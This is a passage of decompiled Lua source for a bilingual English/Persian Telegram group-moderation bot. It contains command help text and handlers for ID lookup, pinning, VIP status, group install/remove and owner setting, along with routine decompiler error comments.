*Demote User From Moderator*\nEMJ `ownerlist` *Get List of Group Owners*\nEMJ `setlink` *Set Group Link For Bot*\nEMJ `clean` *mods/filterlist/rules/welcome/bans/silentlist/reportlist/blacklist/bots/vain/tabchi*\nEMJ `access` *owner/moderator/member*\nEMJ `setlang` [`en`/`fa`] *Change Chat Language*\nEMJ `photoid` [`on`/`off`] *Show Photo in ID Command*\nEMJ `maxchat` [`NUMBER`] *Set Group Max Chat*\nEMJ `lockgroup` [`H`:`M`] [`H`:`M`] *Lock Chat in A Time*\nEMJ `unlockgroup` *Unlock Chat*\nEMJ `sense` [`on`/`off`] *Change Bot Sense*\nEMJ `tosuper` *Change Chat to SuperGroup*\nEMJ `helpme` [`TEXT`] *Send Help To Bot Owner*\nEMJ `warnstatus` [`silent`/`kick`]\nEMJ `config` *Promote all group admins*\nEMJ `backup` *Create Backup From Group Settings*\nEMJ `getbackup` *Use Saved Backup For Change Settings*\nEMJ `rmsg`/`delmsg` [`1`-`1000`] *Clean Group Messages*\n\nYou can use: CONFIG", HelpForModerator = "👉 Cmds For Moderator:\nEMJ `id` *Get ID of User*\nEMJ `setfloodtime` [`NUMBER`]\nEMJ `pin` *Pin A Message in Group*\nEMJ `unpin` *Unpin A Message From Group*\nEMJ `modlist` *Get List of Group Moderators*\nEMJ `lock` *Lock or Unlock An item in Group*\nEMJ `link` *Get Groups Link*\nEMJ `link pv` *Get Groups Link in Pv*\nEMJ `newlink` *Create New Link For Group With Bot*\nEMJ `rules` *Get Group Rules*\nEMJ `settings` *Show Group Settings*\nEMJ `setrules` *Set Group Rules*\nEMJ `setname` *Set Group Name*\nEMJ `setflood` *Change Value of Flood*\nEMJ `res` *Result From UserName*\nEMJ `filterlist` *Show Group Filter List*\nEMJ `setwelcome` *Set Group Welcome*\nEMJ `welcome` [`on`/`off`] *Set Welcome ON or OFF*\nEMJ `mute time` [`NUMBER`] *Change Time of Mute User*\nEMJ `mute` [*sticker*/*photo*/*video*/*voice*/*audio*/*gif*] [`ID`]\nEMJ `unmute` [*sticker*/*photo*/*video*/*voice*/*audio*/*gif*] [`ID`]\nEMJ `mymute`/`mm` *Get Time of Your Mute*\nEMJ `cmds` *Show Cmds Text*\nEMJ `ban` *Ban User From Group*\nEMJ `unban` *Unban User From Group*\nEMJ `banlist` *Show Group Ban List*\nEMJ `silent` *Silent User From Group*\nEMJ `unsilent` *Unsilent User From Group*\nEMJ `silentlist` *Show Silent List*\nEMJ `kick` *Kick User From Group*\nEMJ `delall` *Delete All Message of User*\nEMJ `filter` *Filter Word From Group*\nEMJ `allow` *Allow Word or User From Group*\nEMJ `allowlist` *Show Allow List*\nEMJ `report` *Report A Text of User*\nEMJ `reportlist` *Show Report List*\nEMJ `check` *Check Groups Charge*\nEMJ `votemute` [`ID`] *Vote For Mute User*\nEMJ `delmute` [`ID`] *Delete Votes of User*\nEMJ `warn` [`Reason`] *Warn User With Reason*\nEMJ `delwarn` [`ID`] *Delete Warn of User*\nEMJ `nerkh` *Show Bot Nerk*\nEMJ `setmaxwords` [`NUMBER`] *Set Group Messages Max Words*\n\nYou can use: CONFIG"}
  else
    Helps = {HelpForSudo = "👉 Cmds For Sudo:\nEMJ `install` *نصب گروه روی ربات*\nEMJ `remove` *حذف گروه از ربات*\nEMJ `editBbot` *ویرایش متن های برگشتی ربات*\nEMJ `sudoaccess` [`ID`] *تغییر دسترسی های سودو*\nEMJ `vip` *تنظیم گروه برای حذف تبلیغات*\nEMJ `sendpm` [`TEXT`] *ارسال پیام به تمام گروه های ربات*\nEMJ `sendpm` [`ID`] *ارسال پیام به یک گروه با آیدی*\nEMJ `banall` [`ID`] *محروم کردن شخص از همه گروه های ربات*\nEMJ `unbanall` [`ID`] *آنبن کردن شخص از همه گروه های ربات*\nEMJ `gbanlist` *نمایش لیست محرومان از تمام گروه ها*\nEMJ `reload` *ریلود پلاگین ها*\nEMJ `setsudo` [`ID`] *ارتقا شخص به سودو*\nEMJ `delsudo` [`ID`] *تنزل مقام شخص از سودو*\nEMJ `sudolist` *نمایش لیست سودو ها*\nEMJ `leave` [`LINK`]\nEMJ `autoleave` *enable/disable/status*\nEMJ `creategroup` *ساخت گروه با ربات*\nEMJ `createsuper` *ساخت ابر گروه با ربات*\nEMJ `chats` *نمایش گروه های ربات*\nEMJ `clear cache` *پاکسازی کش های Telegram-Cli*\nEMJ `join` *ربات شما را به گروه اضافه میکند*\nEMJ `charge` [`NUMBER`] *شارژ گروه*\nEMJ `import` [`LINK`] *ربات جوین میده به لینک*\nEMJ `addreply` {سوال} پاسخ\nEMJ `delreply` {سوال} پاسخ\nEMJ `allreply` {سوال}\nEMJ `replyaccess` {Q} [`مقام`]\n\nشما میتوانید از اینها استفاده کنید: CONFIG", HelpForOwner = "👉 Cmds For Owner:\nEMJ `setowner` *تنظیم مالک برای گروه*\nEMJ `unblock` [`ID`] *آزاد سازی کاربر از لیست مسدودی*\nEMJ `setchannel` *تنظیم کانال گروه برای عضویت اجباری*\nEMJ `setforcedinvite` *تنظیم عضو برای دعوت*\nEMJ `addsettings` [`NAME`] *اضافه کردن تنظیمات خصوصی*\nEMJ `delsettings` [`NAME`] *حذف تنظیمات خصوصی*\nEMJ `setmaxwarn` [`NUMBER`]\nEMJ `invitekicked` *دعوت اعضا اخراج شده*\nEMJ `remowner` *حذف مالک از گروه*\nEMJ `promote` *ارتقا شخص به ادمین گروه*\nEMJ `demote` *تنزیل مقام شخص از ادمینی گروه*\nEMJ `ownerlist` *گرفتن لیست مالکان گروه*\nEMJ `setlink` *تنظیم لینک گروه برای ربات*\nEMJ `clean` *mods/filterlist/rules/welcome/bans/silentlist/reportlist/blacklist/bots/vain/tabchi*\nEMJ `access` *owner/moderator/member*\nEMJ `setlang` [`en`/`fa`] *تغییر زبان گروه*\nEMJ `photoid` [`on`/`off`] *نمایش عکس کاربر در دستور آیدی*\nEMJ `maxchat` [`NUMBER`] *تنظیم حداکثر چت در گروه*\nEMJ `lockgroup` [`H`:`M`] [`H`:`M`] *قفل گروه در یک زمان مشخص*\nEMJ `unlockgroup` *بازکردن گروه*\nEMJ `sense` [`on`/`off`] *تغییر تنظیمات هوش ربات*\nEMJ `tosuper` *تغییر گروه به ابر گروه*\nEMJ `helpme` [`TEXT`] *ارسال متن به مالک ربات*\nEMJ `warnstatus` [`silent`/`kick`]\nEMJ `config` *ارتقا تمامی ادمین های گروه*\nEMJ `backup` *بک آپ گرفتن از تنظیمات گروه*\nEMJ `getbackup` *استفاده از بک آپ ذخیره شده برای تغییر تنظیمات*\nEMJ `rmsg`/`delmsg` [`1`-`1000`] *پاکسازی پیام های گروه*\n\nشما میتوانید از اینها استفاده کنید: CONFIG", HelpForModerator = "👉 Cmds For Moderator:\nEMJ `id` *نمایش آیدی یک شخص*\nEMJ `setfloodtime` [`NUMBER`]\nEMJ `pin` *پین کردن پیام در گروه*\nEMJ `unpin` *برداشتن پین پیام در گروه*\nEMJ `modlist` *لیست مدیران گروه*\nEMJ `lock` *قفل یک آیتم در گروه یا بازکردن آن*\nEMJ `link` *لینک گروه*\nEMJ `link pv` *لینک گروه در پیوی*\nEMJ `newlink` *ساخت لینک جدید برای گروه با ربات*\nEMJ `rules` *دریافت قوانین گروه*\nEMJ `settings` *نمایش تنظیمات گروه*\nEMJ `setrules` *تنظیم قوانین گروه*\nEMJ `setname` *تنظیم اسم گروه*\nEMJ `setflood` *تغییر مقدار پیام رگباری*\nEMJ `res` *اطلاعات یک یوزرنیم*\nEMJ `filterlist` *نمایش کلمات فیلتر گروه*\nEMJ `setwelcome` *تنظیم متن خوش آمدگویی گروه*\nEMJ `welcome` [`on`/`off`] *تنظیم خوش آمدگویی*\nEMJ `mute time` [`NUMBER`] *تغییر تایم میوت یک شخص*\nEMJ `mute` [*sticker*/*photo*/*video*/*voice*/*audio*/*gif*] [`ID`]\nEMJ `unmute` [*sticker*/*photo*/*video*/*voice*/*audio*/*gif*] [`ID`]\nEMJ `mymute`/`mm` *نمایش زمان میوت خودتان*\nEMJ `cmds` *نمایش متن دستورات*\nEMJ `ban` *محروم کردن شخص از گروه*\nEMJ `unban` *برداشتن محرومیت شخص از گروه*\nEMJ `banlist` *نمایش افراد محروم گروه*\nEMJ `silent` *خفه کردن کاربر در گروه*\nEMJ `unsilent` *برداشتن سکوت کاربر در گروه*\nEMJ `silentlist` *نمایش لیست سکوت*\nEMJ `kick` *اخراج شخص از گروه*\nEMJ `delall` *پاک کردن تمام پیام های یک کاربر*\nEMJ `filter` *فیلتر کلمه از گروه*\nEMJ `allow` *مجاز کردن یک کلمه یا شخص در گروه*\nEMJ `allowlist` *نمایش لیست مجاز*\nEMJ `report` *گزارش یک متن از یک کاربر*\nEMJ `reportlist` *نمایش لیست گزارشات*\nEMJ `check` *چک کردن شارژ یک گروه*\nEMJ `votemute` [`ID`] *رای دادن برای میوت شدن یک شخص*\nEMJ `delmute` [`ID`] *پاک کردن رای های یک کاربر برای میوت*\nEMJ `warn` [`Reason`] *اخطار به یک کاربر با دلیل*\nEMJ `delwarn` [`ID`] *پاک کردن اخطار های یک کاربر*\nEMJ `nerkh` *نمایش نرخ ربات*\nEMJ `setmaxwords` [`NUMBER`] *تنظیم حداکثر کلمات پیام های گروه*\n\nشما میتوانید از اینها استفاده کنید: CONFIG"}
  end
  -- DECOMPILER ERROR at PC24: Confused about usage of register: R1 in 'UnsetPending'

  if redis:get("EditBot:helpsudo") then
    Helps.HelpForSudo = redis:get("EditBot:helpsudo")
  end
  -- DECOMPILER ERROR at PC38: Confused about usage of register: R1 in 'UnsetPending'

  if redis:get("EditBot:helpownerEN") and not lang then
    Helps.HelpForOwner = redis:get("EditBot:helpownerEN")
  else
    -- DECOMPILER ERROR at PC53: Confused about usage of register: R1 in 'UnsetPending'

    if redis:get("EditBot:helpownerFA") and lang then
      Helps.HelpForOwner = redis:get("EditBot:helpownerFA")
    end
  end
  -- DECOMPILER ERROR at PC67: Confused about usage of register: R1 in 'UnsetPending'

  if redis:get("EditBot:helpmodEN") and not lang then
    Helps.HelpForModerator = redis:get("EditBot:helpmodEN")
  else
    -- DECOMPILER ERROR at PC82: Confused about usage of register: R1 in 'UnsetPending'

    if redis:get("EditBot:helpmodFA") and lang then
      Helps.HelpForModerator = redis:get("EditBot:helpmodFA")
    end
  end
  Emoji = redis:get("EditBot:cmdsemoji") or "�\160 "
  -- DECOMPILER ERROR at PC98: Confused about usage of register: R1 in 'UnsetPending'

  Helps.HelpForSudo = (Helps.HelpForSudo):gsub("EMJ", Emoji)
  -- DECOMPILER ERROR at PC106: Confused about usage of register: R1 in 'UnsetPending'

  Helps.HelpForOwner = (Helps.HelpForOwner):gsub("EMJ", Emoji)
  -- DECOMPILER ERROR at PC114: Confused about usage of register: R1 in 'UnsetPending'

  Helps.HelpForModerator = (Helps.HelpForModerator):gsub("EMJ", Emoji)
  if _config.cmd == "^" then
    if not lang then
      Symbol = "No Symbol"
    else
      Symbol = "بدون علامت"
    end
  else
    Symbol = _config.cmd
    Symbol = (string.gsub)(Symbol, "^", "")
  end
  -- DECOMPILER ERROR at PC142: Confused about usage of register: R1 in 'UnsetPending'

  Helps.HelpForSudo = (Helps.HelpForSudo):gsub("CONFIG", Symbol)
  -- DECOMPILER ERROR at PC150: Confused about usage of register: R1 in 'UnsetPending'

  Helps.HelpForOwner = (Helps.HelpForOwner):gsub("CONFIG", Symbol)
  -- DECOMPILER ERROR at PC158: Confused about usage of register: R1 in 'UnsetPending'

  Helps.HelpForModerator = (Helps.HelpForModerator):gsub("CONFIG", Symbol)
  return Helps
end

GetFaCmds = function()
  -- function num : 0_55 , upvalues : _ENV
  Helps = {HelpForSudo = "☑️ دستورات برای سودو:\nEMJ نصب گروه👈 نصب گروه روی ربات\nEMJ حذف گروه👈 حذف گروه از ربات\nEMJ ویرایش ربات👈 ویرایش متن های برگشتی ربات\nEMJ دسترسی سودو👈 [آیدی] تغییر دسترسی های سودو\nEMJ ارسال پیام👈 ارسال پیام به تمام گروه های ربات\nEMJ ارسال پیام👈 [آیدی] ارسال پیام به یک گروه با آیدی\nEMJ گلوبال بن👈 [آیدی] محروم کردن شخص از همه گروه های ربات\nEMJ گلوبال آنبن👈 [آیدی] آنبن کردن شخص از همه گروه های ربات\nEMJ لیست گلوبال بن👈 نمایش لیست محرومان از تمام گروه ها\nEMJ ریلود👈 ریلود پلاگین ها\nEMJ تنظیم سودو👈 [آیدی] ارتقا شخص به سودو\nEMJ حذف سودو👈 [آیدی] تنزل مقام شخص از سودو\nEMJ لیست سودو👈 نمایش لیست سودو ها\nEMJ ترک گروه👈\nEMJ ترک خودکار👈 فعال/غیرفعال/وضعیت\nEMJ ساخت گروه👈 ساخت گروه با ربات\nEMJ ساخت ابرگروه👈 ساخت ابر گروه با ربات\nEMJ چت ها👈 نمایش گروه های ربات\nEMJ clear cache👈 پاکسازی کش های Telegram-Cli\nEMJ جوین👈 ربات شما را به گروه اضافه میکند\nEMJ شارژ👈 [عدد] شارژ گروه\nEMJ ایمپورت👈 [لینک] ربات جوین میده به لینک\nEMJ اضافه کردن پاسخ👈 {سوال} پاسخ\nEMJ حذف پاسخ👈 {سوال} پاسخ\nEMJ همه پاسخ های👈 {سوال}\nEMJ دسترسی پاسخ👈 {سوال} مقام", HelpForOwner = "☑️ دستورات برای مالک گروه:\nEMJ تنظیم مالک👈 تنظیم مالک برای گروه\nEMJ آزاد سازی👈 [آیدی]\nEMJ تنظیم کانال👈 [آیدی]\nEMJ تنظیم دعوت اجباری👈 [عدد]\nEMJ اضافه کردن تنظیمات👈 [اسم]\nEMJ حذف تنظیمات👈 [اسم]\nEMJ تنظیم حداکثر اخطار👈 [`عدد`]\nEMJ دعوت اعضا اخراج شده👈دعوت کردن اعضایی که در لیست بلاکی هستند\nEMJ حذف مالک👈 حذف مالک از گروه\nEMJ ارتقا👈 ارتقا شخص به ادمین گروه\nEMJ تنزیل👈 تنزیل مقام شخص از ادمینی گروه\nEMJ لیست مالکان👈 گرفتن لیست مالکان گروه\nEMJ تنظیم لینک👈 تنظیم لینک گروه برای ربات\nEMJ پاکسازی👈 مدیران/لیست فیلتر/قوانین/خوش آمد گویی/محرومان/لیست سکوت/لیست گزارش/لیست مسدودی/ربات ها/اعضا بی فایده/تبچی\nEMJ دسترسی👈 مالک/مدیر/ممبر\nEMJ تغییر زبان👈 [انگلیسی/فارسی] تغییر زبان گروه\nEMJ عکس آیدی👈 [روشن/خاموش] نمایش عکس کاربر در دستور آیدی\nEMJ حداکثر چت👈 [عدد] تنظیم حداکثر چت در گروه\nEMJ قفل گروه👈 [H:M] [H:M] قفل گروه در یک زمان مشخص\nEMJ بازکردن قفل👈 بازکردن گروه\nEMJ هوش مصنوعی👈 [روشن/خاموش] تغییر تنظیمات هوش ربات\nEMJ تبدیل به ابرگروه👈 تغییر گروه به ابر گروه\nEMJ راهنمایی👈 [متن] ارسال متن به مالک ربات\nEMJ وضعیت اخطار👈 [سکوت/اخراج]\nEMJ کانفیگ👈 ارتقا تمامی ادمین های گروه\nEMJ بک آپ👈 بک آپ گرفتن از تنظیمات گروه\nEMJ استفاده از بک آپ👈 استفاده از بک آپ ذخیره شده برای تغییر تنظیمات\nEMJ حذف پیام👈 [1-1000] پاکسازی پیام های گروه", HelpForModerator = "☑️ دستورات برای مدیران:\nEMJ آیدی👈 نمایش آیدی یک شخص\nEMJ تنظیم زمان پیام رگباری👈 تغییر زمان پیام رگباری\nEMJ پین👈 پین کردن پیام در گروه\nEMJ آنپین👈 برداشتن پین پیام در گروه\nEMJ لیست مدیران👈 لیست مدیران گروه\nEMJ قفل👈 قفل یک آیتم در گروه یا بازکردن آن\nEMJ لینک گروه👈 لینک گروه\nEMJ لینک گروه پیوی👈 لینک گروه در پیوی\nEMJ لینک جدید👈 ساخت لینک جدید برای گروه با ربات\nEMJ قوانین👈 دریافت قوانین گروه\nEMJ تنظیمات👈 نمایش تنظیمات گروه\nEMJ تنظیم قوانین👈 تنظیم قوانین گروه\nEMJ تنظیم نام👈 تنظیم اسم گروه\nEMJ تنظیم حساسیت پیام رگباری👈 تغییر مقدار پیام رگباری\nEMJ اطلاعات👈 اطلاعات یک یوزرنیم\nEMJ لیست فیلتر👈 نمایش کلمات فیلتر گروه\nEMJ تنظیم خوش آمد گویی👈 تنظیم متن خوش آمدگویی گروه\nEMJ خوش آمد گویی👈 [روشن/خاموش] تنظیم خوش آمدگویی\nEMJ میوت time👈 [عدد] تغییر تایم میوت یک شخص\nEMJ میوت👈 [sticker/photo/video/voice/audio/gif] [آیدی]\nEMJ برداشتن میوت👈 [sticker/photo/video/voice/audio/gif] [آیدی]\nEMJ میوت من👈 نمایش زمان میوت خودتان\nEMJ دستورات👈 نمایش متن دستورات\nEMJ بن👈 محروم کردن شخص از گروه\nEMJ آنبن👈 برداشتن محرومیت شخص از گروه\nEMJ لیست بن👈 نمایش افراد محروم گروه\nEMJ سکوت👈 خفه کردن کاربر در گروه\nEMJ برداشتن سکوت👈 برداشتن سکوت کاربر در گروه\nEMJ لیست سکوت👈 نمایش لیست سکوت\nEMJ اخراج👈 اخراج شخص از گروه\nEMJ حذف همه پیام ها👈 پاک کردن تمام پیام های یک کاربر\nEMJ فیلتر👈 فیلتر کلمه از گروه\nEMJ مجاز👈 مجاز کردن یک کلمه یا شخص در گروه\nEMJ لیست مجاز👈 نمایش لیست مجاز\nEMJ گزارش👈 گزارش یک متن از یک کاربر\nEMJ لیست گزارش👈 نمایش لیست گزارشات\nEMJ چک کردن👈 چک کردن شارژ یک گروه\nEMJ رای میوت👈 [آیدی] رای دادن برای میوت شدن یک شخص\nEMJ حذف میوت👈 [آیدی] پاک کردن رای های یک کاربر برای میوت\nEMJ اخطار👈 [دلیل] اخطار به یک کاربر با دلیل\nEMJ حذف اخطار👈 [آیدی] پاک کردن اخطار های یک کاربر\nEMJ نرخ👈 نمایش نرخ ربات\nEMJ تنظیم حداکثر کلمات👈 [عدد] تنظیم حداکثر کلمات پیام های گروه"}
  -- DECOMPILER ERROR at PC16: Confused about usage of register: R0 in 'UnsetPending'

  if redis:get("EditBot:fahelpsudo") then
    Helps.HelpForSudo = redis:get("EditBot:fahelpsudo")
  end
  -- DECOMPILER ERROR at PC28: Confused about usage of register: R0 in 'UnsetPending'

  if redis:get("EditBot:fahelpowner") then
    Helps.HelpForOwner = redis:get("EditBot:fahelpowner")
  end
  -- DECOMPILER ERROR at PC40: Confused about usage of register: R0 in 'UnsetPending'

  if redis:get("EditBot:fahelpmods") then
    Helps.HelpForModerator = redis:get("EditBot:fahelpmods")
  end
  if redis:get("EditBot:facmdsemoji") then
    Emoji = redis:get("EditBot:facmdsemoji")
    -- DECOMPILER ERROR at PC59: Confused about usage of register: R0 in 'UnsetPending'

    Helps.HelpForSudo = (Helps.HelpForSudo):gsub("👈", Emoji)
    -- DECOMPILER ERROR at PC67: Confused about usage of register: R0 in 'UnsetPending'

    Helps.HelpForOwner = (Helps.HelpForOwner):gsub("👈", Emoji)
    -- DECOMPILER ERROR at PC75: Confused about usage of register: R0 in 'UnsetPending'

    Helps.HelpForModerator = (Helps.HelpForModerator):gsub("👈", Emoji)
  end
  EMJ = redis:get("EditBot:cmdsemoji") or "�\160 "
  -- DECOMPILER ERROR at PC91: Confused about usage of register: R0 in 'UnsetPending'

  Helps.HelpForSudo = (Helps.HelpForSudo):gsub("EMJ", EMJ)
  -- DECOMPILER ERROR at PC99: Confused about usage of register: R0 in 'UnsetPending'

  Helps.HelpForOwner = (Helps.HelpForOwner):gsub("EMJ", EMJ)
  -- DECOMPILER ERROR at PC107: Confused about usage of register: R0 in 'UnsetPending'

  Helps.HelpForModerator = (Helps.HelpForModerator):gsub("EMJ", EMJ)
  return Helps
end

local Mojavez_A_Plus = _config.license
local run = function(msg, matches)
  -- function num : 0_56 , upvalues : _ENV, Mojavez_A_Plus, action_by_reply, action_by_username, modadd, modrem, botremByID, action_by_id, lock_item, lock_item2, mute_item, mute_item2, unlock_item, unmute_item, getChatId, modlist, ownerlist, config, NumberChats, CreateBackup, action_by_reply2, action_by_id2, action_by_username2, action_by_reply_, action_by_username_, filter_word, reload_plugins, run_bash, sudolist, chat_list
  if redis:get((string.reverse)(":esneciLevitcA") .. "" .. Mojavez_A_Plus) then
    local cmd = redis:get("GroupCmdsAccess:" .. (msg.to).id)
    do
      local lang = redis:get("gp_lang:" .. (msg.to).id)
      local data = load_data("./data/moderation.json")
      local chat = msg.chat_id_
      local user = (msg.from).id
      local VarCmd = true
      if cmd == "owner" and not is_owner(msg) then
        VarCmd = false
      else
        if cmd == "moderator" and not is_mod(msg) then
          VarCmd = false
        end
      end
      if redis:get("mute" .. (msg.from).id .. "from" .. (msg.to).id .. "cmds") then
        VarCmd = false
      end
      if VarCmd == true then
        if (matches[1] == "import" or matches[1] == "ایمپورت") and is_sudo(msg) then
          link = matches[2]
          link = (string.gsub)(link, "t.me", "telegram.me")
          link = (string.gsub)(link, "telegram.dog", "telegram.me")
          ;
          (tdcli.importChatInviteLink)(link)
        end
        if (matches[1] == "photoid" or matches[1] == "عکس آیدی") and is_owner(msg) then
          if (matches[2]):lower() == "enable" or (matches[2]):lower() == "on" or matches[2] == "روشن" then
            if not redis:get("photoid:" .. (msg.to).id) then
              redis:set("photoid:" .. (msg.to).id, true)
              if not lang then
                return "*Photo for id command* `has been enabled`"
              else
                return "*عکس برای دستور آیدی* `فعال شد`"
              end
            else
              if redis:get("photoid:" .. (msg.to).id) then
                if not lang then
                  return "*Photo for id command* `is already enabled`"
                else
                  return "*عکس برای دستور آیدی* `از قبل فعال بود`"
                end
              end
            end
          else
            if (matches[2]):lower() == "disable" or (matches[2]):lower() == "off" or matches[2] == "خاموش" then
              if not redis:get("photoid:" .. (msg.to).id) then
                if not lang then
                  return "*Photo for id command* `is not enabled`"
                else
                  return "*عکس برای دستور آیدی* `فعال نیست`"
                end
              else
                if redis:get("photoid:" .. (msg.to).id) then
                  redis:del("photoid:" .. (msg.to).id)
                  if not lang then
                    return "*Photo for id command* `Disabled`"
                  else
                    return "*عکس برای دستور آیدی* `غیر فعال شد`"
                  end
                end
              end
            end
          end
        end
        if (matches[1] == "id" or matches[1] == "آیدی" or matches[1] == "ایدی") and msg.reply_id and not matches[2] then
          if redis:get("CheckExpire::" .. (msg.to).id) then
            tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply, {chat_id = (msg.to).id, cmd = "id"})
          else
            if is_mod(msg) then
              tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply, {chat_id = (msg.to).id, cmd = "id"})
            end
          end
        end
        if (msg.to).type ~= "pv" then
          if matches[1] == "id" or matches[1] == "آیدی" or matches[1] == "ایدی" then
            do
              if not matches[2] and not msg.reply_id then
                local getpro = function(arg, data)
    -- function num : 0_56_0 , upvalues : msg, _ENV, lang
    if (msg.from).username then
      username = "@" .. (msg.from).username
    else
      if not lang then
        username = "Not Found!"
      else
        username = "پیدا نشد!"
      end
    end
    GpChats = redis:get("getMessages:" .. (msg.to).id) or 0
    UsChats = redis:get("getMessages:" .. (msg.from).id .. ":" .. (msg.to).id) or 0
    Percent_ = tonumber(UsChats) / tonumber(GpChats) * 100
    if Percent_ < 10 then
      Percent = "0" .. (string.sub)(Percent_, 1, 4)
    else
      if Percent_ >= 10 then
        Percent = (string.sub)(Percent_, 1, 5)
      end
    end
    if tonumber(Percent) <= 10 then
      if not lang then
        UsStatus = "Weak 😴"
      else
        UsStatus = "ضعیف 😴"
      end
    else
      if tonumber(Percent) <= 20 then
        if not lang then
          UsStatus = "Normal 😊"
        else
          UsStatus = "معمولی 😊"
        end
      else
        if tonumber(Percent) <= 100 then
          if not lang then
            UsStatus = "Active 😎"
          else
            UsStatus = "فعال 😎"
          end
        end
      end
    end
    if not lang then
      idText = "[👥] Chat info:\n*Chat ID:* `" .. (msg.to).id .. "`\n*Number of Chat Messages:* `" .. GpChats .. "`\n\n[👤] Your info:\n*Your ID:* `" .. (msg.from).id .. "`\n*Number of Your Messages:* `" .. UsChats .. "` [%" .. Percent .. "]\n*Status:* " .. UsStatus .. "\n*Your Username:* " .. check_markdown(username)
    else
      idText = "[👥] اطلاعات چت:\nآیدی چت: `" .. (msg.to).id .. "`\nتعداد پیام های چت: `" .. GpChats .. "`\n\n[👤] اطلاعات شما:\nآیدی شما: `" .. (msg.from).id .. "`\nتعداد پیام های شما: `" .. UsChats .. "` [" .. Percent .. "%]\nوضعیت: " .. UsStatus .. "\nیوزرنیم شما: " .. check_markdown(username)
    end
    if redis:get("photoid:" .. (msg.to).id) then
      if (data.photos_)[0] then
        if not lang then
          (tdcli.sendPhoto)((msg.to).id, msg.id_, 0, 1, nil, (((((data.photos_)[0]).sizes_)[1]).photo_).persistent_id_, "[👥] Chat ID: " .. (msg.to).id .. "\n[👤] Your ID: " .. (msg.from).id, dl_cb, nil)
        else
          ;
          (tdcli.sendPhoto)((msg.to).id, msg.id_, 0, 1, nil, (((((data.photos_)[0]).sizes_)[1]).photo_).persistent_id_, "[👥] آیدی چت: " .. (msg.to).id .. "\n[👤] آیدی شما: " .. (msg.from).id, dl_cb, nil)
        end
      else
        if not lang then
          (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "`No Photo!`\n" .. idText, 1, "md")
        else
          if lang then
            (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "`بدون عکس!`\n" .. idText, 1, "md")
          end
        end
      end
    else
      if not redis:get("photoid:" .. (msg.to).id) then
        (tdcli.sendMessage)((msg.to).id, msg.id_, 1, idText, 1, "md")
      end
    end
  end

                do
                  tdcli_function({ID = "GetUserProfilePhotos", user_id_ = (msg.from).id, offset_ = 0, limit_ = 1}, getpro, nil)
                end
              end
              if matches[2] then
                tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username, {chat_id = (msg.to).id, username = matches[2], cmd = "id"})
              end
              do
                if (matches[1] == "pin" or matches[1] == "پین") and is_mod(msg) and msg.reply_id then
                  local lock_pin = redis:hget("GroupSettings:" .. (msg.to).id, "lock_pin")
                  -- DECOMPILER ERROR at PC353: Confused about usage of register: R9 in 'UnsetPending'

                  if lock_pin == "yes" then
                    (data[tostring(chat)]).pin = msg.reply_id
                    save_data("./data/moderation.json", data)
                    ;
                    (tdcli.pinChannelMessage)((msg.to).id, msg.reply_id, 1)
                    if not lang then
                      return "*Message Has Been Pinned*"
                    else
                      return "پیام سجاق شد"
                    end
                  else
                    -- DECOMPILER ERROR at PC380: Confused about usage of register: R9 in 'UnsetPending'

                    if not lock_pin then
                      (data[tostring(chat)]).pin = msg.reply_id
                      save_data("./data/moderation.json", data)
                      ;
                      (tdcli.pinChannelMessage)((msg.to).id, msg.reply_id, 1)
                      if not lang then
                        return "*Message Has Been Pinned*"
                      else
                        if lang then
                          return "پیام سجاق شد"
                        end
                      end
                    end
                  end
                end
                do
                  if (matches[1] == "unpin" or matches[1] == "آنپین" or matches[1] == "برداشتن پین") and is_mod(msg) then
                    local lock_pin = redis:hget("GroupSettings:" .. (msg.to).id, "lock_pin")
                    if lock_pin == "yes" then
                      (tdcli.unpinChannelMessage)((msg.to).id)
                      if not lang then
                        return "*Pin message has been unpinned*"
                      else
                        if lang then
                          return "پیام سنجاق شده پاک شد"
                        end
                      end
                    else
                      if not lock_pin then
                        (tdcli.unpinChannelMessage)((msg.to).id)
                        if not lang then
                          return "*Pin message has been unpinned*"
                        else
                          if lang then
                            return "پیام سنجاق شده پاک شد"
                          end
                        end
                      end
                    end
                  end
                  if matches[1] == "vip" and is_sudo(msg) then
                    if not redis:sismember("SudoAccess" .. (msg.from).id, "installvip") and is_sudo(msg) and not is_botOwner(msg) then
                      if not lang then
                        return ErrorAccessSudo(msg)
                      else
                        return ErrorAccessSudo(msg)
                      end
                    else
                      if not matches[2] then
                        Chat = (msg.to).id
                        if redis:hget("GroupSettings:" .. Chat, "is_vip") then
                          redis:hdel("GroupSettings:" .. Chat, "is_vip")
                          return "وضعیت گروه به حالت عادی (+تبلیغ) تغییر کرد"
                        else
                          redis:hset("GroupSettings:" .. Chat, "is_vip", true)
                          return "وضعیت گروه به حالت V.I.P (ویژه و بدون تبلیغ) تغییر کرد"
                        end
                      else
                        if matches[2] and (matches[2]):match("-100%d+") then
                          Chat = matches[2]
                          if redis:hget("GroupSettings:" .. Chat, "is_vip") then
                            redis:hdel("GroupSettings:" .. Chat, "is_vip")
                            return "وضعیت گروه " .. matches[2] .. " به حالت عادی (+تبلیغ) تغییر کرد"
                          else
                            redis:hset("GroupSettings:" .. Chat, "is_vip", true)
                            return "وضعیت گروه " .. matches[2] .. " به حالت V.I.P (ویژه و بدون تبلیغ) تغییر کرد"
                          end
                        end
                      end
                    end
                  end
                  if (matches[1] == "install" or matches[1] == "نصب گروه") and is_sudo(msg) and not matches[2] then
                    return modadd(msg, false)
                  else
                    if (matches[1] == "install" or matches[1] == "نصب گروه") and is_sudo(msg) and matches[2] then
                      return modadd(msg, tonumber(matches[2]))
                    end
                  end
                  if (matches[1] == "remove" or matches[1] == "حذف گروه") and not matches[2] and is_sudo(msg) then
                    return modrem(msg)
                  end
                  if (matches[1] == "remove" or matches[1] == "حذف گروه") and matches[2] and is_botOwner(msg) then
                    botremByID(msg, matches[2])
                    return "گروه `" .. matches[2] .. "` حذف شد و ربات از آن لفت داد"
                  end
                  if (matches[1] == "setowner" or matches[1] == "تنظیم مالک") and is_owner(msg) then
                    if not matches[2] and msg.reply_id then
                      tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply, {chat_id = (msg.to).id, cmd = "setowner"})
                    end
                    if matches[2] and (string.match)(matches[2], "^%d+$") then
